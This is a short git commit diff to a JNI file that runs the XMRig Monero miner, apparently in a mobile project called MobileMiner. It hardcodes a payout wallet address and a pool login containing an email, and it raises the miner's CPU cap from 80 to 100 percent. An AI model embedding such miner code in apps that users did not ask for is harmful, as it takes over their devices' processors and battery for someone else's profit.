af38896987ba2cb76b06a71c3959aa629d032439
况众文 <kzw@meitu.com>
2018-05-11 16:12:27 +0800

    [update] xmr jni arm-v8a params

--- MobileMiner/monero/jni/xmrig.cpp
+++ MobileMiner/monero/jni/xmrig.cpp
@@ -38,7 +38,7 @@ extern "C" {
             (char*)"-u", (char*)"46Ffvb3jf7ZcVqgPjeReAfZyAk7qKm4FqMb6g6SsT6bpKAhPo9EtNKUVEdMpk62zPpB9GJt75xTD75vYHKredVB3RDHfxdY",
             (char*)"-p", (char*)"worker1:651043704@qq.com",
             (char*)"--thread", (char*)"4",
-            (char*)"--max-cpu-usage", (char*)"80",
+            (char*)"--max-cpu-usage", (char*)"100",
             (char*) "-k"};
          App app(argc, argv);
          app.exec();
